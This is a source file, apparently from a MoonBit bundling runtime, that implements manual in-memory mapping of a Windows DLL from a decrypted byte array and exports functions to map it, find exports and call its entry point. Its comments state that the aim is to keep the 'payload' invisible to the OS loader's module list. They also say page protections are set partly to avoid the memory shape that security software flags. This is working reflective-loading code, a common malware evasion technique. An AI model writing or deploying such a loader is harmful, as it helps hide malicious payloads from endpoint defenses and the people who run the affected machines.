// Manual PE mapping: load a DLL from a byte array, without LoadLibrary on it.
//
// The first in-process increment still called LoadLibraryA on the consumer
// DLL, so the bytes of the consumer had to exist as a file on disk. This
// module closes that gap. The host reads the image once (in a real bundle
// those bytes come from the decrypted archive in memory) and calls
// `lp_map_image`; everything after that - section copy, base relocations,
// import resolution, page protections - happens inside this process and in
// memory. No CreateRemoteThread, no VirtualAllocEx, no WriteProcessMemory:
// VirtualAlloc reserves private pages of the *current* process.
//
// The mapped module is invisible to the OS loader. That is the point: a
// GetModuleHandle("payload.dll") from unrelated code returns NULL while the
// payload is running. It also means the loader does not run DllMain, does not
// register TLS callbacks and does not add the image to the module list. The
// host is therefore given `lp_get_entry` so it can invoke the entry point
// itself, and `lp_get_export` for the function it wants to call. See
// runtime/README.md for the current limits.

///|
const MEM_COMMIT : Int32 = 0x1000

///|
const MEM_RESERVE : Int32 = 0x2000

///|
const MEM_RELEASE : Int32 = 0x8000

///|
const PAGE_READONLY : Int32 = 0x02

///|
const PAGE_EXECUTE_READ : Int32 = 0x20

///|
const PAGE_EXECUTE_READWRITE : Int32 = 0x40

///|
const IMAGE_DIRECTORY_ENTRY_IMPORT : Int32 = 1

///|
const IMAGE_DIRECTORY_ENTRY_BASERELOC : Int32 = 5

///|
const IMAGE_SCN_MEM_EXECUTE : Int64 = 0x20000000L

///|
const IMAGE_SCN_MEM_WRITE : Int64 = 0x80000000L

///|
const IMAGE_REL_BASED_HIGHLOW : Int64 = 3L

///|
const IMAGE_REL_BASED_DIR64 : Int64 = 10L

///|
const MACHINE_AMD64 : Int64 = 0x8664L

///|
const PE32PLUS_MAGIC : Int64 = 0x20bL

// Diagnostic codes returned by `lp_map_error` when mapping returns 0.

///|
pub const MAP_OK : Int32 = 0

///|
pub const MAP_BAD_MZ : Int32 = 1

///|
pub const MAP_BAD_PE : Int32 = 2

///|
pub const MAP_NOT_X64 : Int32 = 3

///|
pub const MAP_TRUNCATED : Int32 = 4

///|
pub const MAP_ALLOC_FAILED : Int32 = 5

///|
pub const MAP_NEEDS_RELOC : Int32 = 6

///|
pub const MAP_IMPORT_DLL : Int32 = 7

///|
pub const MAP_IMPORT_API : Int32 = 8

///|
pub const MAP_ORDINAL_IMPORT : Int32 = 9

///|
pub const MAP_EMPTY : Int32 = 10

///|
/// Reserve private pages in this process. This is a local allocation; it does
/// not touch another process's address space.
extern "C" fn virtual_alloc(
  addr : Int64,
  size : Int64,
  kind : Int32,
  protect : Int32,
) -> Int64 = "VirtualAlloc"

///|
extern "C" fn virtual_free(addr : Int64, size : Int64, kind : Int32) -> Int32 = "VirtualFree"

///|
#borrow(name)
extern "C" fn load_library_a(name : Bytes) -> Int64 = "LoadLibraryA"

///|
extern "C" fn flush_instruction_cache(
  process : Int64,
  base : Int64,
  size : Int64,
) -> Int32 = "FlushInstructionCache"

// ------------------------------------------------------- file image reads ---

///|
fn img_u16(d : Bytes, off : Int64) -> Int64 {
  if off < 0L || off + 2L > d.length().to_int64() {
    return 0L
  }
  le_u16(d, off.to_int()).to_int64()
}

///|
fn img_u32(d : Bytes, off : Int64) -> Int64 {
  if off < 0L || off + 4L > d.length().to_int64() {
    return 0L
  }
  le_u32(d, off.to_int())
}

///|
fn img_u64(d : Bytes, off : Int64) -> Int64 {
  if off < 0L || off + 8L > d.length().to_int64() {
    return 0L
  }
  le_u64(d, off.to_int())
}

///|
/// A slice of the file image, or an empty buffer when the range is not there.
fn img_slice(d : Bytes, off : Int64, len : Int64) -> Bytes {
  if off < 0L || len < 0L || off + len > d.length().to_int64() {
    return b""
  }
  let n = len.to_int()
  let a = FixedArray::make(n, b'\x00')
  for i = 0; i < n; i = i + 1 {
    a[i] = d[off.to_int() + i]
  }
  Bytes::from_array(a[:])
}

///|
/// NUL-terminated ASCII inside the file image.
fn img_cstr(d : Bytes, off : Int64, max : Int64) -> String {
  let mut out = ""
  let mut i = 0L
  while i < max {
    let at = off + i
    if at < 0L || at >= d.length().to_int64() {
      return out
    }
    let c = d[at.to_int()]
    if c == b'\x00' {
      return out
    }
    out = out + String::make(1, c.to_char())
    i = i + 1L
  }
  out
}

///|
/// The layout of an image, read from its file bytes rather than from memory.
struct ImageLayout {
  data : Bytes
  opt : Int64
  dir_base : Int64
  num_dirs : Int64
  section_table : Int64
  num_sections : Int64
  image_base : Int64
  size_of_image : Int64
  size_of_headers : Int64
  entry_rva : Int64
}

///|
fn dir_entry(layout : ImageLayout, index : Int32) -> (Int64, Int64) {
  if index.to_int64() >= layout.num_dirs {
    return (0L, 0L)
  }
  let off = layout.dir_base + index.to_int64() * 8L
  (img_u32(layout.data, off), img_u32(layout.data, off + 4L))
}

///|
/// Translate an RVA into a file offset. Header RVAs map one-to-one; section
/// RVAs map through the raw pointer of the section that contains them.
fn rva_to_file(layout : ImageLayout, rva : Int64) -> Int64? {
  if rva < layout.size_of_headers {
    return Some(rva)
  }
  let mut i = 0L
  while i < layout.num_sections {
    let off = layout.section_table + i * 40L
    let va = img_u32(layout.data, off + 12L)
    let vsize = img_u32(layout.data, off + 8L)
    let raw_size = img_u32(layout.data, off + 16L)
    let raw_ptr = img_u32(layout.data, off + 20L)
    let span = if vsize > raw_size { vsize } else { raw_size }
    if rva >= va && rva < va + span {
      return Some(raw_ptr + (rva - va))
    }
    i = i + 1L
  }
  None
}

///|
fn parse_layout(data : Bytes) -> (ImageLayout, Int32) {
  let empty : ImageLayout = {
    data,
    opt: 0L,
    dir_base: 0L,
    num_dirs: 0L,
    section_table: 0L,
    num_sections: 0L,
    image_base: 0L,
    size_of_image: 0L,
    size_of_headers: 0L,
    entry_rva: 0L,
  }
  if data.length() < 64 || data[0] != b'M' || data[1] != b'Z' {
    return (empty, MAP_BAD_MZ)
  }
  let pe_off = img_u32(data, 0x3cL)
  if img_u32(data, pe_off) != 0x4550L {
    return (empty, MAP_BAD_PE)
  }
  let coff = pe_off + 4L
  if img_u16(data, coff) != MACHINE_AMD64 {
    return (empty, MAP_NOT_X64)
  }
  let opt_size = img_u16(data, coff + 16L)
  let opt = coff + 20L
  if img_u16(data, opt) != PE32PLUS_MAGIC {
    return (empty, MAP_NOT_X64)
  }
  let size_of_headers = img_u32(data, opt + 60L)
  let size_of_image = img_u32(data, opt + 56L)
  let section_table = opt + opt_size
  let num_sections = img_u16(data, coff + 2L)
  if size_of_headers == 0L ||
    size_of_image == 0L ||
    size_of_headers > data.length().to_int64() ||
    section_table + num_sections * 40L > data.length().to_int64() {
    return (empty, MAP_TRUNCATED)
  }
  (
    {
      data,
      opt,
      dir_base: opt + 112L,
      num_dirs: img_u32(data, opt + 108L),
      section_table,
      num_sections,
      image_base: img_u64(data, opt + 24L),
      size_of_image,
      size_of_headers,
      entry_rva: img_u32(data, opt + 16L),
    },
    MAP_OK,
  )
}

// ------------------------------------------------------------ mapping steps ---

///|
fn apply_relocations(
  layout : ImageLayout,
  base : Int64,
  delta : Int64,
) -> Int32 {
  let (rva, size) = dir_entry(layout, IMAGE_DIRECTORY_ENTRY_BASERELOC)
  if rva == 0L || size == 0L {
    return MAP_NEEDS_RELOC
  }
  let start = match rva_to_file(layout, rva) {
    Some(o) => o
    None => return MAP_TRUNCATED
  }
  let end = start + size
  let mut cur = start
  while cur + 8L <= end && cur + 8L <= layout.data.length().to_int64() {
    let page = img_u32(layout.data, cur)
    let block = img_u32(layout.data, cur + 4L)
    if block <= 8L || cur + block > layout.data.length().to_int64() {
      break
    }
    let count = (block - 8L) / 2L
    let mut j = 0L
    while j < count {
      let entry = img_u16(layout.data, cur + 8L + j * 2L)
      let typ = (entry >> 12) & 15L
      let at = base + page + (entry & 0xfffL)
      if typ == IMAGE_REL_BASED_DIR64 {
        poke64(at, peek64(at) + delta)
      } else if typ == IMAGE_REL_BASED_HIGHLOW {
        poke_bytes(at, u32le((peek32(at) + delta) & 0xffffffffL), 4)
      }
      // IMAGE_REL_BASED_ABSOLUTE is padding; every other type is left alone
      // because a normal x64 DLL only uses the two above.
      j = j + 1L
    }
    cur = cur + block
  }
  MAP_OK
}

///|
fn resolve_imports(layout : ImageLayout, base : Int64) -> Int32 {
  let (rva, _) = dir_entry(layout, IMAGE_DIRECTORY_ENTRY_IMPORT)
  if rva == 0L {
    return MAP_OK
  }
  let mut cur = match rva_to_file(layout, rva) {
    Some(o) => o
    None => return MAP_TRUNCATED
  }
  let mut d = 0
  while d < 256 {
    let name_rva = img_u32(layout.data, cur + 12L)
    let first = img_u32(layout.data, cur + 16L)
    if name_rva == 0L && first == 0L {
      break
    }
    let name_off = match rva_to_file(layout, name_rva) {
      Some(o) => o
      None => return MAP_TRUNCATED
    }
    let dll = img_cstr(layout.data, name_off, 128L)
    let handle = load_library_a(cstring(dll))
    if handle == 0L {
      return MAP_IMPORT_DLL
    }
    let original = img_u32(layout.data, cur)
    let lookup_rva = if original != 0L { original } else { first }
    let lookup_off = match rva_to_file(layout, lookup_rva) {
      Some(o) => o
      None => return MAP_TRUNCATED
    }
    let mut i = 0L
    while i < 4096L {
      let entry = img_u64(layout.data, lookup_off + i * 8L)
      if entry == 0L {
        break
      }
      // A negative PE32+ thunk is an ordinal import: its high bit is set.
      if entry < 0L {
        return MAP_ORDINAL_IMPORT
      }
      let hint_off = match rva_to_file(layout, entry & 0xffffffffL) {
        Some(o) => o
        None => return MAP_TRUNCATED
      }
      // IMAGE_IMPORT_BY_NAME is a two-byte hint followed by the ASCII name.
      let api = img_cstr(layout.data, hint_off + 2L, 128L)
      let address = real_get_proc_address(handle, cstring(api))
      if address == 0L {
        return MAP_IMPORT_API
      }
      poke64(base + first + i * 8L, address)
      i = i + 1L
    }
    cur = cur + 20L
    d = d + 1
  }
  MAP_OK
}

///|
/// Give each section the protection its characteristics ask for, instead of
/// leaving the whole image writable and executable. Besides being correct for
/// the payload, this keeps the image out of the RWX shape that security
/// software treats as suspicious.
fn apply_protections(layout : ImageLayout, base : Int64) -> Unit {
  let header_scratch = Bytes::make(4, b'\x00')
  ignore(
    virtual_protect(base, layout.size_of_headers, PAGE_READONLY, header_scratch),
  )
  let mut i = 0L
  while i < layout.num_sections {
    let off = layout.section_table + i * 40L
    let va = img_u32(layout.data, off + 12L)
    let vsize = img_u32(layout.data, off + 8L)
    let raw_size = img_u32(layout.data, off + 16L)
    let chars = img_u32(layout.data, off + 36L)
    let span = if vsize > raw_size { vsize } else { raw_size }
    if span > 0L {
      let executable = (chars & IMAGE_SCN_MEM_EXECUTE) != 0L
      let writable = (chars & IMAGE_SCN_MEM_WRITE) != 0L
      let protect = if executable && writable {
        PAGE_EXECUTE_READWRITE
      } else if executable {
        PAGE_EXECUTE_READ
      } else if writable {
        PAGE_READWRITE
      } else {
        PAGE_READONLY
      }
      let scratch = Bytes::make(4, b'\x00')
      ignore(virtual_protect(base + va, span, protect, scratch))
    }
    i = i + 1L
  }
}

///|
/// Map a DLL image held in `data`. Returns the image base, or 0 with the
/// reason in `lp_map_error`.
fn map_image_bytes(data : Bytes) -> Int64 {
  let (layout, status) = parse_layout(data)
  if status != MAP_OK {
    g_runtime.map_error = status
    return 0L
  }
  let mut base = virtual_alloc(
    layout.image_base,
    layout.size_of_image,
    MEM_COMMIT | MEM_RESERVE,
    PAGE_READWRITE,
  )
  if base == 0L {
    // The preferred base is occupied. Let the OS choose another one; the
    // relocation pass below repairs every absolute reference.
    base = virtual_alloc(
      0L,
      layout.size_of_image,
      MEM_COMMIT | MEM_RESERVE,
      PAGE_READWRITE,
    )
  }
  if base == 0L {
    g_runtime.map_error = MAP_ALLOC_FAILED
    return 0L
  }
  // Headers and sections are copied while the whole image is still writable.
  poke_bytes(
    base,
    img_slice(layout.data, 0L, layout.size_of_headers),
    layout.size_of_headers.to_int(),
  )
  let mut i = 0L
  while i < layout.num_sections {
    let off = layout.section_table + i * 40L
    let va = img_u32(layout.data, off + 12L)
    let raw_ptr = img_u32(layout.data, off + 20L)
    let raw_size = img_u32(layout.data, off + 16L)
    if raw_size > 0L && raw_ptr + raw_size <= layout.data.length().to_int64() {
      poke_bytes(
        base + va,
        img_slice(layout.data, raw_ptr, raw_size),
        raw_size.to_int(),
      )
    }
    i = i + 1L
  }
  let delta = base - layout.image_base
  if delta != 0L {
    let st = apply_relocations(layout, base, delta)
    if st != MAP_OK {
      // The image cannot be repaired at this base; do not leave a half-mapped
      // executable behind.
      ignore(virtual_free(base, 0L, MEM_RELEASE))
      g_runtime.map_error = st
      return 0L
    }
  }
  let st = resolve_imports(layout, base)
  if st != MAP_OK {
    ignore(virtual_free(base, 0L, MEM_RELEASE))
    g_runtime.map_error = st
    return 0L
  }
  apply_protections(layout, base)
  // -1 is the pseudo-handle for the current process.
  ignore(flush_instruction_cache(-1L, base, layout.size_of_image))
  g_runtime.map_error = MAP_OK
  base
}

// ------------------------------------------------------------ C ABI surface ---

///|
/// Map `len` bytes of a DLL image at `data`. The buffer only has to stay alive
/// for this call: headers, sections and the resolved import table are copied
/// into private pages owned by this process.
#export_name("lp_map_image")
pub fn lp_map_image(data : Int64, len : Int32) -> Int64 {
  if data == 0L || len < 64 {
    g_runtime.map_error = MAP_EMPTY
    return 0L
  }
  map_image_bytes(peek_bytes(data, len))
}

///|
/// Why the last `lp_map_image` returned 0. One of the `MAP_*` constants.
#export_name("lp_map_error")
pub fn lp_map_error() -> Int32 {
  g_runtime.map_error
}

///|
/// Address of a named export of a mapped image, or 0 when it has none.
#export_name("lp_get_export")
pub fn lp_get_export(base : Int64, name : Int64) -> Int64 {
  if base == 0L || name == 0L {
    return 0L
  }
  let wanted = ascii_at(name, 128)
  let pe_off = peek32(base + 0x3cL)
  let opt = base + pe_off + 24L
  if peek16(opt) != 0x20b {
    return 0L
  }
  let dd = opt + 112L
  let export_rva = peek32(dd)
  if export_rva == 0L {
    return 0L
  }
  let ed = base + export_rva
  let num_names = peek32(ed + 24L).to_int()
  let functions = peek32(ed + 28L)
  let names = peek32(ed + 32L)
  let ordinals = peek32(ed + 36L)
  let mut i = 0
  while i < num_names {
    let step = (i * 4).to_int64()
    let name_rva = peek32(base + names + step)
    if ascii_at(base + name_rva, 128) == wanted {
      let ordinal = peek16(base + ordinals + (i * 2).to_int64()).to_int64()
      let function_rva = peek32(base + functions + ordinal * 4L)
      // A function RVA that lands inside the export directory is a forwarder,
      // which a manually mapped image cannot resolve on its own.
      if function_rva >= export_rva &&
        function_rva < export_rva + peek32(dd + 4L) {
        return 0L
      }
      return base + function_rva
    }
    i = i + 1
  }
  0L
}

///|
/// Address of DllMain of a mapped image. The OS loader is not involved, so
/// the host has to invoke the entry point itself if the payload needs it.
#export_name("lp_get_entry")
pub fn lp_get_entry(base : Int64) -> Int64 {
  if base == 0L {
    return 0L
  }
  let pe_off = peek32(base + 0x3cL)
  let opt = base + pe_off + 24L
  let entry_rva = peek32(opt + 16L)
  if entry_rva == 0L {
    return 0L
  }
  base + entry_rva
}

///|
/// Release the private pages of a mapped image. Imported system DLLs are
/// deliberately left loaded: they are shared, loader-owned modules.
#export_name("lp_unmap_image")
pub fn lp_unmap_image(base : Int64) -> Int32 {
  if base == 0L {
    return 0
  }
  virtual_free(base, 0L, MEM_RELEASE)
}
